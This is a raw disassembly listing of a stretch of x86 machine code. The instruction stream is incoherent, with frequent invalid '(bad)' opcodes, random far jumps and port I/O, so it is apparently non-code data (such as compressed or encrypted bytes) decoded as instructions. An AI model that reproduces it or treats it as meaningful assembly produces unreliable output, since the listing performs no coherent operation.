  420510:	jnp    0x4204bb
  420512:	adc    eax,0x3cfa877d
  420517:	out    dx,eax
  420518:	(bad)  
  420519:	iret   
  42051a:	xchg   esi,eax
  42051b:	in     eax,0x37
  42051d:	push   ss
  42051e:	jg     0x4204b4
  420520:	aas    
  420521:	(bad)  
  420522:	jb     0x420521
  420524:	fimul  DWORD PTR [ebx+eax*4+0x5f]
  420528:	sub    eax,0x46c9988
  42052d:	call   0x4f90:0xa61ed698
  420534:	sub    al,0x82
  420536:	shr    DWORD PTR [ebx+eax*1],1
  420539:	(bad)  
  42053a:	into   
  42053b:	cmp    al,0xca
  42053d:	mov    edi,0xf834d2e2
  420542:	std    
  420543:	cld    
  420544:	loop   0x42054c
  420546:	pcmpeqb mm1,QWORD PTR [ebx-0x530eede7]
  42054d:	cdq    
  42054e:	call   DWORD PTR [ebx]
  420550:	leave  
  420551:	dec    ecx
  420552:	imul   esp,edx,0xffffffe6
  420555:	or     ecx,DWORD PTR [eax-0x7b5ca94b]
  42055b:	stos   BYTE PTR es:[edi],al
  42055c:	push   eax
  42055d:	loop   0x420546
  42055f:	cmp    BYTE PTR [ecx+0x28d634e9],dh
  420565:	push   ecx
  420566:	mov    edi,0x686e2629
  42056b:	mov    dh,0x8e
  42056d:	mov    bl,0x8
  42056f:	test   eax,0xffe71689
  420574:	pushf  
  420575:	mov    esi,0xea12fc06
  42057a:	dec    edx
  42057b:	xchg   ebx,eax
  42057c:	xchg   esi,eax
  42057d:	dec    ebx
  42057e:	fist   WORD PTR [ecx+0x6a]
  420581:	jo     0x42050b
  420583:	pop    ebx
  420584:	pop    esi
  420585:	aaa    
  420586:	dec    ebx
  420587:	dec    esi
  420588:	dec    esi
  420589:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42058a:	jns    0x4205f8
  42058c:	ss pusha 
  42058e:	ins    DWORD PTR es:[edi],dx
  42058f:	nop
  420590:	add    BYTE PTR [ebx-0x3a857d1c],bh
  420596:	jnp    0x420595
  420598:	pop    edi
  420599:	sar    DWORD PTR [ebp+0xc],cl
  42059c:	aas    
  42059d:	shl    BYTE PTR [eax+0xad88cb6],0xc3
  4205a4:	ja     0x42059f
  4205a6:	mov    esi,0xad6d4bf9
  4205ab:	gs loope 0x420592
  4205ae:	inc    edx
  4205af:	je     0x420535
  4205b1:	mov    al,0x95
  4205b3:	jmp    0x552a:0x70b6e5d3
  4205ba:	sub    ebp,DWORD PTR [edi-0x5953579b]
  4205c0:	jmp    0x4ce7:0x30cf61d
  4205c7:	mov    ch,0x70
  4205c9:	mov    ebx,0x6e1ce859
  4205ce:	or     ch,BYTE PTR [edx]
  4205d0:	mov    bh,0x8c
  4205d2:	push   ebp
  4205d3:	fwait
  4205d4:	cmp    ebp,ebp
  4205d6:	data16 aad 0xd7
  4205d9:	mov    edi,0x56658304
  4205de:	aad    0xa8
  4205e0:	mov    cl,0x7c
  4205e2:	mov    ebp,0x857073ff
  4205e7:	sti    
  4205e8:	sbb    DWORD PTR ds:0x8e95c9b3,ebx
  4205ee:	sub    al,0x64
  4205f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205f1:	in     eax,0xa8
  4205f3:	pop    es
  4205f4:	mov    BYTE PTR [esi-0x25],0x95
  4205f8:	in     eax,dx
  4205f9:	mov    eax,ds:0x39ead848
  4205fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205ff:	ja     0x42064e
  420601:	inc    edx
  420602:	idiv   DWORD PTR [eax+ebx*8+0x133d54be]
  420609:	test   eax,0xd8ea0f94
  42060e:	addr16 inc esi
  420610:	shl    BYTE PTR [ecx],0xa9
  420613:	push   ds
  420614:	jnp    0x4205d7
  420616:	push   es
  420617:	inc    edx
  420618:	gs and ebx,esi
  42061b:	dec    eax
  42061c:	pop    ds
  42061d:	(bad)  
  42061e:	pop    esp
  42061f:	imul   esp,DWORD PTR [esi+0x53],0xffffffd8
  420623:	test   DWORD PTR ds:0x184d02e7,ebx
  420629:	pop    edi
  42062a:	xchg   DWORD PTR [esi-0x9],esp
  42062d:	leave  
  42062e:	clc    
  42062f:	pushf  
  420630:	ret    0x481b
  420633:	cwde   
  420634:	push   cs
  420635:	pop    ebx
  420636:	adc    DWORD PTR [esi],edi
  420638:	mov    ebx,0x7f7781f2
  42063d:	fwait
  42063e:	jp     0x4205cc
  420640:	mov    ?,WORD PTR [eax+0x79]
  420643:	sahf   
  420644:	jns    0x420618
  420646:	cmp    BYTE PTR [ecx+0x6b27ab50],0x4b
  42064d:	add    DWORD PTR [esi-0xe],ecx
  420650:	pop    edi
  420651:	dec    ebx
  420652:	ficomp WORD PTR [edi-0x1763ce55]
  420658:	iret   
  420659:	aaa    
  42065a:	(bad)  
  42065c:	(bad)  
  42065d:	jnp    0x4206ba
  42065f:	sub    eax,0x27662b80
  420664:	js     0x420625
  420666:	push   ss
  420667:	out    0xe4,eax
  420669:	xor    cl,dh
  42066b:	sub    eax,DWORD PTR [eax-0x4d3904ee]
  420671:	and    ch,BYTE PTR [eax+eax*4+0x5a6eebfa]
  420678:	hlt    
  420679:	add    eax,0x9365baa6
  42067e:	pop    edi
  42067f:	out    dx,al
  420680:	ins    DWORD PTR es:[edi],dx
  420681:	jmp    0xe244:0x972ba413
  420688:	sbb    bl,BYTE PTR [esi]
  42068a:	mov    DWORD PTR [edx],ecx
  42068c:	pop    ss
  42068d:	ret    
  42068e:	(bad)  
  42068f:	(bad)  
  420690:	hlt    
  420691:	icebp  
  420692:	or     dh,BYTE PTR [esi]
  420694:	inc    ebx
  420695:	cmp    DWORD PTR [ecx],0x49d1ee9d
  42069b:	lods   eax,DWORD PTR ds:[esi]
  42069c:	dec    esi
  42069d:	add    DWORD PTR [eax-0x51],esp
  4206a0:	sub    al,0x5e
  4206a2:	sbb    DWORD PTR [ecx+0x33],0xffffffb7
  4206a6:	push   cs
  4206a7:	xchg   DWORD PTR [edx-0x5aaf3fb],eax
  4206ad:	es push ecx
  4206af:	retf   0x7d96
  4206b2:	cld    
  4206b3:	or     BYTE PTR [ebp+0x3f],cl
  4206b6:	inc    esi
  4206b7:	punpcklbw mm5,mm5
  4206ba:	pop    eax
  4206bb:	or     esp,DWORD PTR [esi+0x1c]
  4206be:	mov    BYTE PTR [eax*1-0x24da7565],cl
  4206c5:	jge    0x420736
  4206c7:	sti    
  4206c8:	push   ss
  4206c9:	cmp    esp,ebx
  4206cb:	push   edx
  4206cc:	mov    ss,WORD PTR [ecx-0x13]
  4206cf:	js     0x420747
  4206d1:	(bad)  
  4206d2:	loopne 0x420752
  4206d4:	or     BYTE PTR [ebp-0x3fd54086],0x19
  4206db:	dec    esp
  4206dc:	dec    ecx
  4206dd:	scas   al,BYTE PTR es:[edi]
  4206de:	cmp    al,dl
  4206e0:	inc    esi
  4206e1:	(bad)  
  4206e3:	cld    
  4206e4:	pop    es
  4206e5:	sti    
  4206e6:	inc    edx
  4206e7:	mov    eax,ds:0x96b0df96
  4206ec:	lea    eax,[ebx-0x7336a1ea]
  4206f2:	(bad)  
  4206f3:	cli    
  4206f4:	jmp    0x8c84:0x8e4569a6
  4206fb:	int3   
  4206fc:	dec    ecx
  4206fd:	xor    bl,dh
  4206ff:	and    al,0xe0
  420701:	stc    
  420702:	and    DWORD PTR [eax+0x2d],edx
  420705:	and    eax,DWORD PTR [eax]
  420707:	fimul  DWORD PTR [edx+0x7e]
  42070a:	mov    bh,0x6c
  42070c:	icebp  
  42070d:	dec    edi
  42070e:	ins    BYTE PTR es:[edi],dx
  42070f:	lods   eax,DWORD PTR ds:[esi]
  420710:	jmp    0x4206c6
  420712:	or     BYTE PTR [ecx-0x62],bl
  420715:	sub    BYTE PTR [ebp+esi*4+0x24],bh
  420719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42071a:	scas   eax,DWORD PTR es:[edi]
  42071b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42071c:	in     al,0xb
  42071e:	cmp    ecx,DWORD PTR [esi-0x1115da]
  420724:	stc    
  420725:	pop    ecx
  420726:	and    BYTE PTR [edi+0x49],dl
  420729:	xchg   edi,eax
  42072a:	jnp    0x4206f0
  42072c:	xor    esp,DWORD PTR [ebx-0x7c]
  42072f:	mov    ebp,0x10fe4a14
  420734:	popa   
  420735:	lock call 0xaf57:0xf627fe4f
  42073d:	imul   ebx,DWORD PTR [ebp-0x53],0xffffffd4
  420741:	out    0x22,al
  420743:	sbb    ebp,DWORD PTR [esi-0x358bcd86]
  420749:	fsub   QWORD PTR [eax+0x36]
  42074c:	and    ah,0xc4
  42074f:	sub    esi,DWORD PTR [ebx]
  420751:	jo     0x420781
  420753:	and    DWORD PTR [eax],edi
  420755:	adc    BYTE PTR [ecx+0x7525c936],0xa7
  42075c:	hlt    
  42075d:	cmc    
  42075e:	outs   dx,BYTE PTR ds:[esi]
  42075f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420760:	cld    
  420761:	mov    ecx,edx
  420763:	dec    eax
  420764:	jle    0x420703
  420766:	dec    DWORD PTR [ebx]
  420768:	daa    
  420769:	(bad)  
  42076a:	xlat   BYTE PTR ds:[ebx]
  42076b:	dec    eax
  42076c:	pop    ecx
  42076d:	daa    
  42076e:	shr    BYTE PTR [edi-0x6bf34f8d],1
  420774:	out    0xdb,eax
  420776:	test   eax,0xf536a369
  42077b:	arpl   WORD PTR [ecx-0x1a],si
  42077e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42077f:	or     edi,0xe
  420782:	jecxz  0x420784
  420784:	lods   eax,DWORD PTR ds:[esi]
  420785:	sbb    DWORD PTR [edx-0x31],0xffffffed
  420789:	aam    0x4e
  42078b:	sbb    al,0x50
  42078d:	and    BYTE PTR [esi+0x581ec582],bh
  420793:	out    dx,al
  420794:	into   
  420795:	xor    al,0x83
  420797:	push   esi
  420798:	adc    DWORD PTR [eax-0x29],edi
  42079b:	int3   
  42079c:	jo     0x4207f2
  42079e:	jae    0x4207d0
  4207a0:	jle    0x42079d
  4207a2:	stc    
  4207a3:	mov    dl,0xb4
  4207a5:	dec    edi
  4207a6:	xor    al,0xbf
  4207a8:	mov    ebp,0x6652a2ea
  4207ad:	adc    dh,0xcd
  4207b0:	nop
  4207b1:	loop   0x4207c8
  4207b3:	xchg   eax,esi
  4207b5:	outs   dx,BYTE PTR ds:[esi]
  4207b6:	dec    ecx
  4207b7:	or     al,BYTE PTR [edx-0x9c0b20c]
  4207bd:	inc    esp
  4207be:	inc    edx
  4207bf:	sub    BYTE PTR [edx+0x21d572b],ah
  4207c5:	jecxz  0x4207c7
  4207c7:	lea    dx,[eax+edx*1+0x6d528683]
  4207cf:	aaa    
  4207d0:	loop   0x42076c
  4207d2:	bound  edi,QWORD PTR [esp+ebx*1+0xe]
  4207d6:	adc    ecx,ecx
  4207d8:	pop    ebp
  4207d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207da:	in     eax,0xa3
  4207dc:	xchg   ebx,eax
  4207de:	mov    ch,0xdc
  4207e0:	push   edx
  4207e1:	xchg   ecx,eax
  4207e2:	je     0x420806
  4207e4:	mov    al,ds:0xdd1c1e81
  4207e9:	(bad)  
  4207ea:	dec    esi
  4207eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4207ec:	cmp    edi,esp
  4207ee:	fisub  WORD PTR [ebx+eiz*1]
  4207f1:	mov    ebp,0xf377aac
  4207f6:	les    ebp,FWORD PTR [ebx]
  4207f8:	push   edi
  4207f9:	jne    0x420829
  4207fb:	mov    dh,0x48
  4207fd:	mov    al,ds:0xef8c2e33
  420802:	mov    al,0x1d
  420804:	jmp    0x420796
  420806:	repnz cs gs (bad) 
  42080a:	inc    DWORD PTR [edx+0x2d]
  42080d:	lods   al,BYTE PTR ds:[esi]
  42080e:	xor    cl,BYTE PTR [ebp+0x197b6162]
  420814:	(bad)  
  420815:	cwde   
  420816:	outs   dx,BYTE PTR ds:[esi]
  420817:	bnd jbe 0x420838
  42081a:	fcmovnbe st,st(3)
  42081c:	jo     0x420870
  42081e:	stos   DWORD PTR es:[edi],eax
  42081f:	clc    
  420820:	xchg   ebp,eax
  420821:	and    BYTE PTR [ebx],ah
  420823:	int3   
  420824:	vorps  xmm6,xmm3,XMMWORD PTR [edi]
  420828:	dec    ecx
  420829:	stos   BYTE PTR es:[edi],al
  42082a:	mov    edx,0x8a39d8e7
  42082f:	fwait
  420830:	repnz xor dl,BYTE PTR [ebx+edi*1]
  420834:	mov    bh,0x73
  420836:	add    BYTE PTR [ebp+0x3202a1c8],dl
  42083c:	loop   0x4207f6
  42083e:	xor    eax,0x7252caa6
  420843:	in     al,0xc4
  420845:	(bad)  
  420846:	shr    DWORD PTR [edx+eax*8],1
  420849:	mov    cl,0xd1
  42084b:	cmovp  ebx,DWORD PTR [edx-0x4f0a7c1b]
  420852:	and    ecx,DWORD PTR [ecx+0x38]
  420855:	test   DWORD PTR [ebp-0x4b],edx
  420858:	aad    0xd9
  42085a:	xor    BYTE PTR [ebx-0x15],bh
  42085d:	pop    ss
  42085e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42085f:	ucomiss xmm5,xmm0
  420862:	inc    ebp
  420863:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420864:	repz shr DWORD PTR ds:0x5a252bac,1
  42086b:	and    ch,BYTE PTR [ebp-0x31]
  42086e:	dec    esi
  42086f:	mov    edi,0x7f30faf8
  420874:	repnz in al,0xcf
  420877:	xchg   edx,eax
  420878:	add    edi,esi
  42087a:	jl     0x42087c
  42087c:	es jecxz 0x4208ab
  42087f:	mov    ds:0xfacdf1d9,al
  420884:	jmp    0xe6f3fce8
  420889:	mov    edi,0xc3017475
  42088e:	cwde   
  42088f:	cdq    
  420890:	aad    0x86
  420892:	pop    edi
  420893:	rol    BYTE PTR [edi+0x30],1
  420896:	aad    0xec
  420898:	fidivr WORD PTR [esi]
  42089a:	popa   
  42089b:	push   ebp
  42089c:	jl     0x4208c9
  42089e:	popf   
  42089f:	inc    ebp
  4208a0:	push   0x4d3324e
  4208a5:	ins    DWORD PTR es:[edi],dx
  4208a6:	and    DWORD PTR [eax-0x548b7c62],eax
  4208ac:	mov    al,0x5f
  4208ae:	jno    0x4208db
  4208b0:	sbb    cl,ch
  4208b2:	xor    edi,DWORD PTR [esi+0x12884501]
  4208b8:	fbstp  TBYTE PTR [ebx-0x42]
  4208bb:	stos   BYTE PTR es:[edi],al
  4208bc:	ins    WORD PTR es:[edi],dx
  4208be:	cld    
  4208bf:	std    
  4208c0:	fwait
  4208c1:	leave  
  4208c2:	mov    bl,0x6d
  4208c4:	rcl    BYTE PTR [ebp-0x29],1
  4208c7:	or     ebx,DWORD PTR [eax+0x65]
  4208ca:	(bad)  
  4208cb:	in     eax,0x23
  4208cd:	add    al,BYTE PTR [edx+0x371c211d]
  4208d3:	pop    ebx
  4208d4:	mov    al,0x58
  4208d6:	addr16 push ds
  4208d8:	and    al,0x7a
  4208da:	xor    eax,DWORD PTR [edx+0x19]
  4208dd:	jg     0x42086a
  4208df:	push   es
  4208e0:	gs enter 0xe85e,0x85
  4208e5:	mov    ah,0xa5
  4208e7:	inc    edx
  4208e8:	jge    0x420875
  4208ea:	mov    BYTE PTR [esi-0x4c],ah
  4208ed:	in     al,0x26
  4208ef:	pushw  es
  4208f1:	popa   
  4208f2:	pop    edx
  4208f3:	sbb    BYTE PTR [eax],bl
  4208f5:	lea    edi,[edi]
  4208f7:	ins    BYTE PTR es:[edi],dx
  4208f8:	mul    DWORD PTR [edi]
  4208fa:	gs inc edx
  4208fc:	xor    al,0x5a
  4208fe:	test   BYTE PTR [ebx],al
  420900:	dec    ebx
  420901:	retf   0x38cc
  420904:	cmp    DWORD PTR [eax-0x45ee7c],eax
  42090a:	dec    edi
  42090b:	xor    BYTE PTR [edi-0x74],bh
  42090e:	sub    DWORD PTR [ebx],edi
  420910:	pop    eax
  420911:	pop    edx
  420912:	or     al,0xbd
  420914:	loop   0x420959
  420916:	fidivr DWORD PTR [eax+0x5d42fab3]
  42091c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42091d:	or     DWORD PTR [edi+ecx*4],esp
  420920:	hlt    
  420921:	cmp    bh,cl
  420923:	push   ds
  420924:	adc    DWORD PTR [ebp-0x6a],eax
  420927:	pop    DWORD PTR [ebx]
  420929:	jo     0x42092a
  42092b:	(bad)  
  42092c:	and    BYTE PTR [esi],dh
  42092e:	push   edx
  42092f:	adc    DWORD PTR [ebx-0x2e],ecx
  420932:	xor    ecx,DWORD PTR [ebp+0x3c84d73d]
  420938:	pop    ebp
  420939:	(bad)  
  42093a:	mov    esi,0xda009693
  42093f:	and    al,0x7c
  420941:	sub    BYTE PTR ds:0xcd9d0a9f,0x61
  420948:	adc    DWORD PTR [esi+ecx*2],ebp
  42094b:	jae    0x4208f2
  42094d:	popf   
  42094e:	cmp    DWORD PTR ds:0x509e6fb4,esp
  420954:	add    eax,0x79501734
  420959:	hlt    
  42095a:	dec    esi
  42095b:	xchg   esi,eax
  42095c:	fcomp  QWORD PTR [ebx+0x21b28fed]
  420962:	inc    edi
  420963:	pusha  
  420964:	in     eax,dx
  420965:	mov    eax,ds:0xda9593db
  42096a:	mov    WORD PTR ds:0x589b1d2b,ds
  420970:	mov    edi,0x28b51c4a
  420975:	call   0xf07de1b9
  42097a:	pop    edi
  42097b:	(bad)  
  42097c:	add    BYTE PTR [ebp-0x7f],ah
  42097f:	js     0x42093b
  420981:	out    dx,eax
  420982:	xor    dl,ah
  420984:	adc    BYTE PTR [edx-0x114ee96b],bh
  42098a:	cwde   
  42098b:	xchg   esi,eax
  42098c:	fnsave [ecx]
  42098e:	ins    DWORD PTR es:[edi],dx
  42098f:	mov    ds:0xaf1f8aa7,eax
  420994:	outs   dx,DWORD PTR ds:[esi]
  420995:	jge    0x420974
  420997:	dec    eax
  420998:	stc    
  420999:	fsub   st,st(0)
  42099b:	sub    al,0xe8
  42099d:	push   edi
  42099e:	or     bh,BYTE PTR [ebx+0xa]
  4209a1:	mov    eax,0x3796d129
  4209a6:	inc    esi
  4209a7:	sbb    al,0xc5
  4209a9:	cmc    
  4209aa:	test   ebp,esp
  4209ac:	test   al,0x1a
  4209ae:	cmp    BYTE PTR [ebp-0x58],dh
  4209b1:	dec    ebx
  4209b2:	jge    0x420a06
  4209b4:	mov    bl,0x1
  4209b6:	jo     0x4209ed
  4209b8:	mov    dl,0x11
  4209ba:	hlt    
  4209bb:	adc    al,al
  4209bd:	loop   0x420a3c
  4209bf:	push   0xffffff9c
  4209c1:	shl    ecx,cl
  4209c3:	(bad)  
  4209c5:	inc    esp
  4209c6:	mov    cl,0x2
  4209c8:	and    bh,BYTE PTR [edx+eax*4]
  4209cb:	push   edx
  4209cc:	gs int 0xd9
  4209cf:	fisttp QWORD PTR [edx-0x1de1cbfd]
  4209d5:	mov    esi,0xbe3e73cf
  4209da:	mov    ebx,0x33adb3f4
  4209df:	dec    edi
  4209e0:	call   0x5fb29ac1
  4209e5:	dec    esp
  4209e6:	test   DWORD PTR [ecx+0x2],ebx
  4209e9:	ficom  WORD PTR [esi-0x50]
  4209ec:	cmp    eax,0x4b384f07
  4209f1:	or     eax,0xebc55e80
  4209f6:	inc    ebp
  4209f7:	mov    ds:0x65ddbbc5,eax
  4209fc:	jmp    0x36e:0x4afa215e
  420a03:	mov    dl,0x6b
  420a05:	addr16 mov al,ds:0x3c10
  420a09:	or     esi,DWORD PTR [eax-0x6a]
  420a0c:	std    
  420a0d:	popf   
  420a0e:	push   0x1
  420a10:	push   cs
  420a11:	das    
  420a12:	cmp    BYTE PTR [edi],bl
  420a14:	ins    BYTE PTR es:[edi],dx
  420a15:	ins    DWORD PTR es:[edi],dx
  420a16:	ins    BYTE PTR es:[edi],dx
  420a17:	and    BYTE PTR [eax-0x3eb0903a],al
  420a1d:	pop    ecx
  420a1e:	push   cs
  420a1f:	(bad)  [edi]
  420a21:	xchg   esp,eax
  420a22:	sub    DWORD PTR es:[esi+edi*2+0x7e],esi
  420a27:	fmul   st(5),st
  420a29:	or     eax,0x799e3b8c
  420a2e:	rcl    DWORD PTR [edi],cl
  420a30:	retf   
  420a31:	and    bl,BYTE PTR [eax]
  420a33:	push   es
  420a34:	enter  0x5dac,0x1c
  420a38:	outs   dx,BYTE PTR ds:[esi]
  420a39:	nop
  420a3a:	and    bh,BYTE PTR [eax-0x45]
  420a3d:	mov    edx,0xc730c722
  420a42:	jae    0x420a13
  420a44:	jg     0x4209f8
  420a46:	jae    0x420a41
  420a48:	lahf   
  420a49:	jmp    0x420a55
  420a4b:	hlt    
  420a4c:	cwde   
  420a4d:	mov    esi,0x801ab719
  420a52:	cmp    ebx,DWORD PTR [ecx+esi*2]
  420a55:	mov    ah,0xb1
  420a57:	in     eax,dx
  420a58:	inc    edi
  420a59:	and    ah,cl
  420a5b:	xor    dh,ch
  420a5d:	cld    
  420a5e:	jp     0x420ab7
  420a60:	jnp    0x420a3d
  420a62:	pop    edi
  420a63:	adc    dl,BYTE PTR cs:[esi]
  420a66:	clc    
  420a67:	cmp    BYTE PTR [ebx-0x31],dh
  420a6a:	push   ss
  420a6b:	adc    dh,al
  420a6d:	jno    0x4209f5
  420a6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a70:	inc    eax
  420a71:	bound  edx,QWORD PTR [eax-0x5]
  420a74:	xor    edi,DWORD PTR [edi-0x53]
  420a77:	sub    eax,0xb0ef97ad
  420a7c:	mov    ebp,0x3b235648
  420a81:	and    edx,ebp
  420a83:	jmp    0x420a93
  420a85:	scas   al,BYTE PTR es:[edi]
  420a86:	retf   
  420a87:	inc    eax
  420a88:	push   ss
  420a89:	(bad)
  420a8d:	call   0x55e0:0x41f0
  420a93:	aaa    
  420a94:	hlt    
  420a95:	mov    ch,BYTE PTR [eax+0x56449ea9]
  420a9b:	sub    BYTE PTR [eax+ebp*2],0x4e
  420a9f:	mov    BYTE PTR [esi+0x2d],cl
  420aa2:	and    DWORD PTR [ebp+0x0],ebp
  420aa5:	jns    0x420a7f
  420aa7:	out    dx,eax
  420aa8:	adc    DWORD PTR [edx],edx
  420aaa:	loop   0x420a4a
  420aac:	cmc    
  420aad:	retf   
  420aae:	mov    ds:0xe05ecfe2,al
  420ab3:	push   esp
  420ab4:	ins    BYTE PTR es:[edi],dx
  420ab5:	sbb    eax,0xc5fa0471
  420aba:	jne    0x420a69
  420abc:	js     0x420b05
  420abe:	scas   eax,DWORD PTR es:[edi]
  420abf:	dec    edi
  420ac0:	add    BYTE PTR [ecx-0x4d957da3],ah
  420ac6:	mov    esi,0xa38b0c5
  420acb:	lods   al,BYTE PTR ds:[esi]
  420acc:	adc    esi,ebx
  420ace:	pop    eax
  420acf:	xchg   BYTE PTR [esi+0x3b],bh
  420ad2:	in     al,dx
  420ad3:	lahf   
  420ad4:	js     0x420b44
  420ad6:	jns    0x420ac1
  420ad8:	enter  0x718b,0x55
  420adc:	retf   0xb396
  420adf:	test   DWORD PTR [edx-0x7],edi
  420ae2:	inc    ebx
  420ae3:	inc    ebx
  420ae4:	test   BYTE PTR [eax],0x4f
  420ae7:	xchg   ecx,eax
  420ae8:	pop    es
  420ae9:	sbb    eax,0x9d493fdb
  420aee:	cmc    
  420aef:	cmp    eax,0x6f3ac70a
  420af4:	xor    eax,0x2571c325
  420af9:	push   ebx
  420afa:	xor    ebx,ebx
  420afc:	jbe    0x420ac5
  420afe:	(bad)
  420b02:	push   es
  420b03:	dec    ebp
  420b04:	xchg   edi,eax
  420b05:	adc    eax,0xd2e2eb98
  420b0a:	jb     0x420b24
  420b0c:	cdq    
  420b0d:	add    BYTE PTR [ecx],bl
  420b0f:	and    ecx,edi
  420b11:	fs dec ebx
  420b13:	(bad)
  420b17:	pop    es
  420b18:	sub    BYTE PTR [ebx],0x92
  420b1b:	cmp    esp,ebx
  420b1d:	call   0x82b97eda
  420b22:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b23:	mov    al,0x9d
  420b25:	mov    fs,ebp
  420b27:	cmp    cl,dh
  420b29:	pop    ebp
  420b2a:	or     eax,0xa03e70dd
  420b2f:	call   0xf473d13a
  420b34:	mov    esp,0x2617cea8
  420b39:	or     esp,DWORD PTR [edi]
  420b3b:	mov    ecx,0xf39e2521
  420b40:	push   ecx
  420b41:	cmp    DWORD PTR [esi],edi
  420b43:	mov    ch,0x17
  420b45:	pop    edi
  420b46:	jge    0x420adc
  420b48:	lock or cl,ah
  420b4b:	lock rsqrtps xmm7,XMMWORD PTR [esi]
  420b4f:	dec    esp
  420b50:	mov    ecx,0xa6514547
  420b55:	fs popa 
  420b57:	and    BYTE PTR [ebx],bh
  420b59:	jb     0x420b75
  420b5b:	adc    al,0x1f
  420b5d:	fdiv   DWORD PTR [ecx+0x4c]
  420b60:	xor    cl,bl
  420b62:	pusha  
  420b63:	sbb    eax,0x3780a93
  420b68:	out    dx,al
  420b69:	nop
  420b6a:	push   esp
  420b6b:	or     ch,bl
  420b6d:	or     al,BYTE PTR [esi-0xe]
  420b70:	pop    ds
  420b71:	stos   DWORD PTR es:[edi],eax
  420b72:	xor    BYTE PTR [ebx-0x551440cf],dh
  420b78:	mov    dl,0x7f
  420b7a:	xchg   BYTE PTR [esi+0x1bdd3a9c],dl
  420b80:	aas    
  420b81:	adc    eax,0xd69fc595
  420b86:	inc    edx
  420b87:	xchg   cl,bl
  420b89:	sub    edi,DWORD PTR ds:0x29d5f3fb
  420b8f:	retf   
  420b90:	push   es
  420b91:	scas   eax,DWORD PTR es:[edi]
  420b92:	or     al,0x7b
  420b94:	leave  
  420b95:	test   eax,0x5fb30b8e
  420b9a:	out    dx,al
  420b9b:	and    eax,0x89f6e67f
  420ba0:	mov    ds:0x93ed4102,al
  420ba5:	adc    BYTE PTR [eax-0x59],bh
  420ba8:	mov    WORD PTR [ecx],ss
  420baa:	push   cs
  420bab:	push   ebx
  420bac:	xchg   esi,eax
  420bad:	mov    WORD PTR [edx],es
  420baf:	or     eax,0x8fcb4491
  420bb4:	js     0x420bbd
  420bb6:	mov    dl,0xc4
  420bb8:	aas    
  420bb9:	ss mov dh,0x43
  420bbc:	addr16 (bad) 
  420bbe:	jb     0x420c10
  420bc0:	mov    al,ds:0x17058a5
  420bc5:	inc    esp
  420bc6:	or     ebx,edx
  420bc8:	mov    esp,0x9fc39c79
  420bcd:	cmp    eax,0x6094006b
  420bd2:	jno    0x420b73
  420bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bd5:	sahf   
  420bd6:	push   0x3b
  420bd8:	adc    DWORD PTR [edi],edi
  420bda:	add    ecx,edx
  420bdc:	mov    edx,0xf51d4e86
  420be1:	arpl   si,bx
  420be3:	jmp    0xd75f668a
  420be8:	add    BYTE PTR [ebx],bl
  420bea:	pop    ebp
  420beb:	test   BYTE PTR [eax-0x4a],bl
  420bee:	retf   
  420bef:	retf   
  420bf0:	pusha  
  420bf1:	lods   al,BYTE PTR ds:[esi]
  420bf2:	pushf  
  420bf3:	mov    dh,0x38
  420bf5:	bswap  esp
  420bf7:	das    
  420bf8:	inc    edx
  420bf9:	hlt    
  420bfa:	outs   dx,BYTE PTR ds:[esi]
  420bfb:	pop    ecx
  420bfc:	je     0x420bad
  420bfe:	vunpcklps ymm2,ymm3,YMMWORD PTR [edi+0x320a4468]
  420c06:	ja     0x420bde
  420c08:	std    
  420c09:	mov    al,ds:0xdbb95f27
  420c0e:	adc    eax,0xe5073901
  420c13:	test   al,0xfe
  420c15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c16:	jmp    0x9dfb:0xc4c28e91
  420c1d:	or     eax,0xf4d619fa
  420c22:	call   0x278c:0x103edeee
  420c29:	pushf  
  420c2a:	xor    DWORD PTR [ebp+0x45],esp
  420c2d:	cli    
  420c2e:	add    ebx,eax
  420c30:	xor    al,0x20
  420c32:	mov    ecx,eax
  420c34:	mov    edx,0x9e60cc0d
  420c39:	int    0x8e
  420c3b:	sub    DWORD PTR [ebp-0x42],ebx
  420c3e:	retf   
  420c3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c40:	jp     0x420c43
  420c42:	cmp    al,0x59
  420c44:	pop    ss
  420c45:	sub    edi,DWORD PTR [eax-0x70]
  420c48:	sub    BYTE PTR [edx-0x4ce38465],ch
  420c4e:	lods   eax,DWORD PTR ds:[esi]
  420c4f:	push   0xffffffa1
  420c51:	push   ecx
  420c52:	xchg   BYTE PTR [edi-0x4a9f42fb],ch
  420c58:	sbb    eax,0x20afb9
  420c5d:	xchg   esp,eax
  420c5e:	cmp    edi,DWORD PTR [esi-0x338d46ce]
  420c64:	xchg   edx,eax
  420c65:	fs in  eax,dx
  420c67:	fcomp  DWORD PTR [ecx]
  420c69:	hlt    
  420c6a:	fstp   DWORD PTR [edx]
  420c6c:	jge    0x420c15
  420c6e:	or     eax,0x9048634a
  420c73:	push   cs
  420c74:	mov    ds:0x974e9018,eax
  420c79:	fsubr  QWORD PTR [ebx]
  420c7b:	xchg   esi,eax
  420c7c:	sbb    al,0x8f
  420c7e:	ins    BYTE PTR es:[edi],dx
  420c7f:	adc    eax,0x237fab3b
  420c84:	dec    edi
  420c85:	inc    edi
  420c86:	mov    ds:0x3b503d80,al
  420c8b:	fcmovu st,st(2)
  420c8d:	sahf   
  420c8e:	fldenv [eax+0x58]
  420c91:	xchg   edx,eax
  420c92:	imul   ecx,DWORD PTR [edx-0x5a716443],0xc9cd50d8
  420c9c:	rcl    BYTE PTR [edx-0x3ceb6042],1
  420ca2:	or     bl,BYTE PTR [edi-0x5d73369d]
